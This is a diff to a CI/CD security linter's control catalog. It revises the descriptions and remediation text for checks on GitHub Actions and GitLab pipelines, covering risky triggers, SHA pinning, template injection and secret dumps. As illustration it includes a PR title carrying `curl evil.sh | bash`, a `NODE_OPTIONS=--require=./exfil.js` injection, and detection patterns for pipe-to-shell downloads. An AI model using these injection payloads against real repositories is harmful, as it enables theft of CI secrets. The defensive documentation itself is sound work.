@@ -107,9 +107,9 @@ export const controlCatalog: Record<
   pullRequestTargetMustNotCheckoutHead: {
     github: {
       controlDescription:
-        "Flags any workflow on the `pull_request_target` trigger that explicitly checks out the PR head (`github.event.pull_request.head.sha` or `head_ref`). That job runs the PR author's code while holding the base repository's secrets and a write-scoped `GITHUB_TOKEN`.",
+        "Flags workflows on the `pull_request_target` trigger that check out the PR head (`github.event.pull_request.head.sha` or `head_ref`): the PR author's code then runs with the base repository's secrets and a write-scoped `GITHUB_TOKEN`. A job-level same-repository guard silences the finding, since fork code never runs.",
       controlWhyItMatters:
-        "This is the exact pattern behind the March 2025 tj-actions / reviewdog compromise: any step after the head checkout, whether `npm install`, `pytest`, or even reading attacker-supplied files, becomes a direct secret-exfiltration path. Prefer the `pull_request` trigger (no secret access on fork PRs), or hand untrusted code to a separate `workflow_run` job that never checks it out.",
+        "The exact pattern behind the March 2025 tj-actions / reviewdog compromise: every step after the head checkout is a secret-exfiltration path. Prefer the `pull_request` trigger, which runs fork PRs without secret access.",
     },
   },
   containerImageMustComeFromAuthorizedSources: {
@@ -199,13 +199,13 @@ export const controlCatalog: Record<
   externalRefsMustNotCollide: {
     gitlab: {
       controlDescription:
-        "Flags `include:` refs (project `ref:` or CI/CD component `@version`) that resolve upstream as both a tag and a branch.",
+        "Flags `include:` refs (project `ref:` or CI/CD component `@version`) that resolve upstream as both a tag and a branch. API-backed: stays silent when the upstream probe cannot run.",
       controlWhyItMatters:
         "A tag deletion or rename can silently rebind the include to a mutable branch, swapping the revision that runs. Pin by commit SHA.",
     },
     github: {
       controlDescription:
-        "Flags `uses: owner/repo@ref` references that resolve upstream as both a tag and a branch.",
+        "Flags `uses: owner/repo@ref` references that resolve upstream as both a tag and a branch. API-backed: stays silent when the upstream probe cannot run.",
       controlWhyItMatters:
         "A tag deletion, rename, or typo can silently switch which revision runs. Pin by 40-char commit SHA.",
     },
@@ -251,7 +251,7 @@ export const controlCatalog: Record<
   pipelineMustNotUseUnsafeVariableExpansion: {
     gitlab: {
       controlDescription:
-        "Detects user-controlled CI variables expanded in shell re-interpretation contexts (`eval`, `sh -c`, `bash -c`, `source`).",
+        "Detects user-controlled CI variables expanded in shell re-interpretation contexts (`eval`, `sh -c`/`bash -c`, `envsubst` or `xargs` piped into a shell, `source`/`.` sourcing).",
       controlWhyItMatters:
         "Prevents command injection via crafted branch names, MR titles, or commit messages (OWASP CICD-SEC-1).",
     },
@@ -273,7 +273,7 @@ export const controlCatalog: Record<
     },
     github: {
       controlDescription:
-        "Detects security scanning jobs neutralized by `continue-on-error: true`, narrow `if:` conditions, or always-skip triggers.",
+        "Detects security scanning jobs (glob-matched via `securityJobPatterns`) that set `continue-on-error: true`, so scan failures never fail the pipeline.",
       controlWhyItMatters:
         "Same OWASP CICD-SEC-4 pattern as on GitLab: a green pipeline that secretly skipped its security scan is worse than no scan.",
     },
@@ -281,7 +281,7 @@ export const controlCatalog: Record<
   pipelineMustNotExecuteUnverifiedScripts: {
     gitlab: {
       controlDescription:
-        "Detects jobs that download and immediately execute scripts from the internet (`curl | bash`, `wget | sh`, download-then-execute) without integrity verification.",
+        "Detects jobs that download and immediately execute scripts from the internet (`curl | bash`, `wget | sh`, download-then-execute, base64 pipe-to-shell) without integrity verification.",
       controlWhyItMatters:
         "Prevents supply chain attacks where a compromised URL serves a modified script that exfiltrates secrets (OWASP CICD-SEC-3, CICD-SEC-8).",
     },
@@ -379,7 +379,7 @@ export const controlCatalog: Record<
   actionsMustBePinnedByCommitSha: {
     github: {
       controlDescription:
-        "Verifies every `uses: owner/repo@ref` is pinned by a 40-character commit SHA, not a mutable tag or branch.",
+        "Verifies step-level `uses:` references and job-level reusable-workflow calls are pinned by a 40-character commit SHA, not a mutable tag or branch. Local `./…` actions and `trustedOwners` (default: `actions`, `github`) are exempt.",
       controlWhyItMatters:
         "Defends against the March 2025 tj-actions / reviewdog supply chain compromise pattern (CVE-2025-30066), where attackers retag actions to point at malicious code that then runs with the caller's secrets.",
     },
@@ -403,7 +403,7 @@ export const controlCatalog: Record<
   actionsMustNotCarryKnownCVEs: {
     github: {
       controlDescription:
-        "Same step-level `uses:` scope as ISSUE-702. Queries GitHub Advisory Database (`actions` ecosystem); semver-filters by `vulnerable_version_range` when the ref is a tag. SHA pins without a resolvable tag may match conservatively.",
+        "Same step-level `uses:` scope as ISSUE-702. Queries GitHub Advisory Database (`actions` ecosystem); semver-filters by `vulnerable_version_range` when the ref resolves to a release version. Refs that cannot be resolved (a SHA with no release tag, a mutable non-numeric tag) abstain with a 'could not verify' warning.",
       controlWhyItMatters:
         "Catches known-vulnerable action versions (e.g. tj-actions CVE-2025-30066). Requires API auth; abstains without it. PBOM: `hasCve` + `advisories: [GHSA-\u2026]`.",
     },
@@ -411,7 +411,7 @@ export const controlCatalog: Record<
   workflowMustNotInjectUserInputInScripts: {
     github: {
       controlDescription:
-        "Detects `${{ github.event.* }}` expressions inlined directly into `run:` shell scripts.",
+        "Detects attacker-controlled free-text expressions (`github.event.*` titles, bodies, branch names, commit messages, fork metadata, author identity, plus `github.head_ref`) inlined directly into `run:` shell scripts. Numeric, boolean, enum and SHA fields are deliberately not flagged.",
       controlWhyItMatters:
         "Workflow template-injection is the GitHub Actions equivalent of SQL injection: the PR title or branch name becomes part of the executed shell command.",
     },
@@ -419,7 +419,7 @@ export const controlCatalog: Record<
   workflowMustNotWriteUntrustedContentToGitHubEnv: {
     github: {
       controlDescription:
-        "Flags a `run:` step that writes an untrusted `${{ github.event.* }}` / `${{ github.head_ref }}` expression into `$GITHUB_ENV` or `$GITHUB_PATH` (via `>>`, `>`, or `tee -a`).",
+        "Flags a `run:` step where attacker-controlled free text (same field list as ISSUE-207) reaches `$GITHUB_ENV` or `$GITHUB_PATH`: inlined directly, dereferenced from an `env:`-bound shell variable, or written through a heredoc body (sinks: `>>`, `>`, `tee`).",
       controlWhyItMatters:
         "Both files are sticky: every later step inherits the variable or PATH entry. An attacker-controlled value can set `NODE_OPTIONS=--require=./exfil.js` or front-load a malicious PATH directory and hijack later steps. Worst under `pull_request_target` / `workflow_run`, where the run carries secrets.",
     },
@@ -435,7 +435,7 @@ export const controlCatalog: Record<
   workflowsMustDeclarePermissions: {
     github: {
       controlDescription:
-        "Flags workflows that omit a top-level `permissions:` block, relying on the repo's default GITHUB_TOKEN permissions.",
+        "Flags each job whose effective permissions are undeclared: no job-level `permissions:` block and no workflow-level one to fall back to, so the GITHUB_TOKEN keeps the repository default.",
       controlWhyItMatters:
         "Implicit permissions default to whatever the repo / org allows, often write-all. Explicit minimum scopes shrink blast radius on a token leak.",
     },
@@ -443,9 +443,9 @@ export const controlCatalog: Record<
   workflowMustNotUseDangerousTriggers: {
     github: {
       controlDescription:
-        "Flags workflows triggered by `pull_request_target` or `workflow_run`.",
+        "Flags jobs that combine a secret-bearing, fork-influenceable trigger (`workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion`, `discussion_comment`, `gollum`, `fork`) with a checkout of fork-controlled code and no same-repo or trusted-author guard. The trigger alone is never flagged; `pull_request_target` is owned by ISSUE-804.",
       controlWhyItMatters:
-        "These triggers grant secret access to PR-author-controlled code paths. They are the root cause behind the highest-impact GitHub Actions CVEs of the last two years.",
+        "These triggers run with the base repository's secrets while unprivileged users can fire them; add a fork-controlled checkout and attacker code executes with those secrets (the March 2025 tj-actions vector, CVE-2025-30066).",
     },
   },
   workflowMustNotGrantPermissionsWriteAll: {
@@ -819,7 +819,7 @@ github:
       description:
         "A GitHub Actions workflow serialises the whole `secrets` context with `toJson(secrets)` or `toJSON(secrets)` and pipes the result into a step's environment, `run:` script, or `with:` input. The resulting string contains every secret the job has access to (repository, organisation and environment) and travels through whatever downstream consumer the step passes it to (a third-party action, a remote server, a log line). Even with GitHub's automatic log redaction, a single `echo` of the JSON payload has been enough to leak tokens in past supply-chain incidents; a compromised reusable action sees them directly regardless of logging.",
       impact:
-        "GitHub's redactor masks known secret *strings* in logs. A `toJson(secrets)` dump produces a single JSON value containing every secret as a substring of a larger string; the redactor does not recognise the wrapping and the secrets leak verbatim. The risk compounds when the dump is forwarded to anything outside GitHub's runtime: a curl, a docker run, a scratch file picked up by an artifact upload.",
+        "GitHub's redactor masks known secret strings in logs. A `toJson(secrets)` dump produces a single JSON value containing every secret as a substring of a larger string; the redactor does not recognise the wrapping and the secrets leak verbatim. The risk compounds when the dump is forwarded to anything outside GitHub's runtime: a curl, a docker run, a scratch file picked up by an artifact upload.",
       remediation:
         "Pass only the specific secrets the step needs, by name: `env: { TOKEN: ${{ secrets.NPM_TOKEN }} }`. If the step forwards credentials to a reusable workflow, name each one in the `secrets:` block of the call rather than using `toJson(secrets)` or `secrets: inherit`.",
       badExample: `# .github/workflows/deploy.yml: ❌ Aggregated secrets dump
@@ -2206,7 +2206,7 @@ variables:
       controlName: "Security jobs must not be weakened",
       controlConfigKey: "securityJobsMustNotBeWeakened",
       description:
-        "A security-scan job in a GitHub Actions workflow is neutralized via `continue-on-error: true`, a narrow `if:` condition that never triggers, or a trigger filter that effectively skips it.",
+        "A security-scan job in a GitHub Actions workflow sets `continue-on-error: true`, so the pipeline stays green even when the scan fails or finds issues. Only the literal boolean is detected; expressions like `continue-on-error: ${{ ... }}` cannot be proven on statically and are not flagged.",
       impact:
         "A weakened security scan gives a false sense of security — the pipeline reports green, but the scan either never ran or its findings were silently ignored. Same OWASP CICD-SEC-4 pattern as on GitLab.",
       remediation:
@@ -2216,10 +2216,9 @@ jobs:
   analyze:
     runs-on: ubuntu-latest
     continue-on-error: true   # ← findings ignored
-    if: github.event_name == 'workflow_dispatch'   # ← only manual
     steps:
       - uses: github/codeql-action/analyze@v3`,
-      badExampleCaption: "Findings are ignored, and the job only runs on manual dispatch.",
+      badExampleCaption: "Scan findings never fail the pipeline; the job reports green regardless.",
       goodExample: `# .github/workflows/codeql.yml: ✅ Runs on every push, fails on findings
 jobs:
   analyze:
@@ -2239,7 +2238,7 @@ github:
       tips: [
         "Plumber identifies security jobs by glob-matching against `<workflow-file-basename-without-.yml>/<job-id>`. The full pattern reference (four shapes, real-world slash-form examples) lives in the [CLI documentation's Security Job Weakening Detection section](/docs/cli).",
         "Customise `securityJobPatterns` for your stack. The defaults ship wildcard-wrapped (`*codeql*`, `*-sast`, `*scan*`, ...) so they catch project-specific prefixes; you can drop the wildcards once you know your workflow-file layout.",
-        "`continue-on-error: true` on the workflow level is fine; on a security scan job it isn't.",
+        "`continue-on-error: true` is only flagged on jobs matching the security patterns; on other jobs (a flaky-test shard, an experimental matrix leg) it is fine.",
       ],
       relatedCodes: ["ISSUE-211", "ISSUE-904"],
     },
@@ -2677,7 +2676,7 @@ jobs:
       controlName: "Third-party actions must be pinned by commit SHA",
       controlConfigKey: "actionsMustBePinnedByCommitSha",
       description:
-        "A workflow step references a third-party action by a mutable ref (tag like `v4` or branch like `main`) instead of a 40-character commit SHA.",
+        "A workflow step (or a job-level reusable-workflow call) references a third-party action by a mutable ref (tag like `v4` or branch like `main`) instead of a 40-character commit SHA.",
       impact:
         "Tag and branch refs are mutable. The March 2025 `tj-actions/changed-files` compromise (CVE-2025-30066) retagged a stable version to point at malicious code that exfiltrated repo secrets from every CI run consuming the action, and there were thousands of them.",
       remediation:
@@ -2700,7 +2699,7 @@ jobs:
       - uses: tj-actions/changed-files@cc733854b1f224978ef800d29e4709d5ee2883e4 # v46.0.5
       - uses: some-third-party/action@a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4 # v2.1.0
 
-# .plumber.yaml: opt in + skip first-party actions
+# .plumber.yaml: skip first-party actions
 github:
   controls:
     actionsMustBePinnedByCommitSha:
@@ -2710,7 +2709,7 @@ github:
       tips: [
         "List `actions` and `github` under `trustedOwners` to skip the rule for first-party GitHub-owned actions.",
         "Local actions (`uses: ./.github/actions/foo`) are always exempt because they live in the same repo.",
-        "Pair with ISSUE-702–115 for a complete supply-chain ruleset (archived repos, impostor SHAs, stale pins, etc.).",
+        "Pair with ISSUE-702, ISSUE-707 and ISSUE-709 for a complete supply-chain ruleset (archived repos, impostor SHAs, stale pins).",
       ],
       relatedCodes: ["ISSUE-702", "ISSUE-707", "ISSUE-708", "ISSUE-709", "ISSUE-703"],
     },
@@ -3274,7 +3273,7 @@ github:
       controlName: "Workflow must not inline user input into shell scripts",
       controlConfigKey: "workflowMustNotInjectUserInputInScripts",
       description:
-        "A `run:` step inlines an attacker-controlled **free-text** `github` field directly into a shell command. The expression value is interpolated by GitHub *before* the shell parses it, so a malicious PR title, comment body, or branch name becomes part of the executed script. The check fires only on the genuinely injectable subfields (titles, bodies, ref names, commit messages, fork metadata, author identity). Numeric, boolean, enum and SHA fields are deliberately ignored because they cannot carry an injection payload.",
+        "A `run:` step inlines an attacker-controlled **free-text** `github` field directly into a shell command. The expression value is interpolated by GitHub **before** the shell parses it, so a malicious PR title, comment body, or branch name becomes part of the executed script. The check fires only on the genuinely injectable subfields (titles, bodies, ref names, commit messages, fork metadata, author identity). Numeric, boolean, enum and SHA fields are deliberately ignored because they cannot carry an injection payload.",
       impact:
         "Template injection is the GitHub Actions equivalent of SQL injection. A PR titled `foo`; curl evil.sh | bash; #` becomes a runtime shell command with the workflow's secrets in scope. This is the #1 cause of secret exfiltration on GitHub Actions over the past two years.",
       remediation:
@@ -3300,7 +3299,7 @@ jobs:
 # .plumber.yaml
 github:
   controls:
-    workflowMustNotInlineUserInputIntoShell:
+    workflowMustNotInjectUserInputInScripts:
       enabled: true`,
       goodExampleCaption: "The shell sees a single argument; quoting is automatic.",
       tips: [
@@ -3368,7 +3367,7 @@ jobs:
       description:
         "A workflow routes PR-author-controlled content into `$GITHUB_ENV` or `$GITHUB_PATH`: directly (`echo \"KEY=${{ github.event.* }}\" >> $GITHUB_ENV`), through an `env:`-bound shell variable, or through a heredoc/redirect whose body dereferences the value.",
       impact:
-        "Writing attacker-controlled content to $GITHUB_ENV creates an environment variable for every subsequent step in the job. A title containing newlines (`foo\\nMALICIOUS_PATH=...`) can inject *multiple* env vars at once, including overriding $PATH.",
+        "Writing attacker-controlled content to $GITHUB_ENV creates an environment variable for every subsequent step in the job. A title containing newlines (`foo\\nMALICIOUS_PATH=...`) can inject multiple env vars at once, including overriding $PATH.",
       remediation:
         "Binding the value through `env:` stops command injection (ISSUE-207) but not this: a newline still opens a second `$GITHUB_ENV` line and any value poisons `$GITHUB_PATH`. Base64-encode the untrusted value itself before writing it (so no newline survives) or wrap it in `toJSON`. If it's only needed within one step, keep it in `env:` and don't write to the sticky file at all.",
       badExample: `# .github/workflows/triage.yml: ❌ Untrusted into $GITHUB_ENV
@@ -3437,7 +3436,7 @@ jobs:
       - run: ./auto-merge.sh`,
       goodExampleCaption: "The PR must come from the same repository (not a fork).",
       tips: [
-        "For Dependabot specifically, use `github.event.pull_request.user.login == 'dependabot[bot]'` *and* `github.actor == 'dependabot[bot]'` *and* check that the PR was opened from `dependabot/` branches.",
+        "For Dependabot specifically, use `github.event.pull_request.user.login == 'dependabot[bot]'` AND `github.actor == 'dependabot[bot]'` AND check that the PR was opened from `dependabot/` branches.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-802"],
@@ -3804,7 +3803,7 @@ jobs:
       controlName: "Workflow permissions must be declared",
       controlConfigKey: "workflowsMustDeclarePermissions",
       description:
-        "A workflow has no top-level `permissions:` block. The job inherits whatever the repo / organisation default is, which is often write-all.",
+        "A job declares no `permissions:` block at either the job or the workflow level. Its GITHUB_TOKEN inherits whatever the repo / organisation default is, which is often write-all. Jobs covered by a workflow-level or job-level block are not flagged.",
       impact:
         "Implicit permissions are silently broad. A workflow that legitimately needs `contents: read` may end up with `contents: write`, `id-token: write`, and a dozen other scopes. A compromised step can use any one of them to push to the repo or impersonate the workflow.",
       remediation:
@@ -3834,7 +3833,7 @@ jobs:
 # .plumber.yaml
 github:
   controls:
-    workflowMustDeclarePermissions:
+    workflowsMustDeclarePermissions:
       enabled: true`,
       goodExampleCaption: "`contents: read` is sufficient for a test workflow.",
       tips: [
@@ -4051,9 +4050,9 @@ jobs:
       controlName: "Workflow must not use dangerous triggers",
       controlConfigKey: "workflowMustNotUseDangerousTriggers",
       description:
-        "A job runs under a trigger that combines attacker-controlled input with the base repository's secrets (`workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion`, `discussion_comment`, `gollum`, `fork`) **and checks out fork-controlled code** (an `actions/checkout` whose `ref:` is the workflow_run head or a PR-controlled ref). Untrusted code then executes with the base repo's secrets and GITHUB_TOKEN. The `pull_request_target` case is owned by [ISSUE-804](./ISSUE-804) (`pullRequestTargetMustNotCheckoutHead`), so this rule never fires on it: same exploit class, dedicated rule, no double-firing. Subscribing to such a trigger is **not** flagged on its own: labelling, milestone, comment and notification workflows legitimately need them and are safe without an untrusted checkout. The finding fires only on the exploitable combination, and abstains when a job-level `if:` neutralises the risk: a same-repository pull-request guard, a `workflow_run` gated to an upstream push (`github.event.workflow_run.event == 'push'`), or a trusted `author_association` allowlist.",
+        "A job runs under a trigger that carries the base repository's secrets while being fireable by unprivileged users (`workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion`, `discussion_comment`, `gollum`, `fork`) and checks out fork-controlled code: untrusted code then executes with the base repo's secrets and GITHUB_TOKEN. The trigger alone is never flagged, and a recognised job-level `if:` guard (same-repository check, `workflow_run` gated to an upstream push, trusted `author_association` allowlist) silences the finding. The `pull_request_target` case is owned by ISSUE-804.",
       impact:
-        "This is the same exploit class as the March 2025 tj-actions/changed-files vector (CVE-2025-30066) that exfiltrated secrets from hundreds of projects including aquasecurity/trivy. Once fork code runs with the base repo's secrets, every shell step is a direct exfiltration path: `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content). The blast radius is the union of the job's permissions and every secret the workflow can read.",
+        "The same exploit class as the March 2025 tj-actions/changed-files compromise (CVE-2025-30066). Once fork code runs with the base repo's secrets, every shell step is an exfiltration path (`npm install` scripts, `pytest` conftest.py, even attacker-supplied file content); the blast radius is the union of the job's permissions and every secret the workflow can read.",
       remediation:
         "Three options, from strongest to most permissive: (1) drop the head checkout and let the job only operate on the base branch; (2) move the work to a plain `pull_request` trigger that runs without secret access; or (3) keep the head checkout but add a same-repository `if:` guard so fork-controlled runs never reach the job. Option 3 is the right answer for trusted-maintainer-only preview/build flows.",
       badExample: `# .github/workflows/preview.yml: ❌ workflow_run chains off a fork-influenceable workflow
@@ -4113,7 +4112,7 @@ github:
       controlName: "pull_request_target must not check out the PR head",
       controlConfigKey: "pullRequestTargetMustNotCheckoutHead",
       description:
-        "A workflow on the `pull_request_target` trigger explicitly checks out `github.event.pull_request.head.sha` (or `head_ref`). The job has access to the base repository's secrets *and* runs the PR author's code.",
+        "A workflow on the `pull_request_target` trigger explicitly checks out `github.event.pull_request.head.sha` (or `head_ref`). The job has access to the base repository's secrets and runs the PR author's code.",
       impact:
         "This is the exact pattern behind the March 2025 tj-actions / reviewdog compromise. Any shell step that runs after the checkout is a direct path to secret exfiltration: `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content).",
       remediation:
@@ -4143,6 +4142,7 @@ jobs:
       goodExampleCaption: "`pull_request` runs without secret access on fork PRs, so the head checkout is safe.",
       tips: [
         "If a workflow truly needs both PR code AND secrets, the right pattern is: PR workflow uploads diff artefact → trusted workflow_run consumes it (no checkout).",
+        "A job-level same-repository `if:` guard (e.g. `github.event.pull_request.head.repo.full_name == github.repository`, `head.repo.fork == false`) silences the finding: fork-controlled code never reaches the checkout.",
         "Plumber's default-on `actionsMustBePinnedByCommitSha` + ISSUE-802 + this rule cover the tj-actions class of vulnerabilities end-to-end.",
       ],
       status: "shipping",
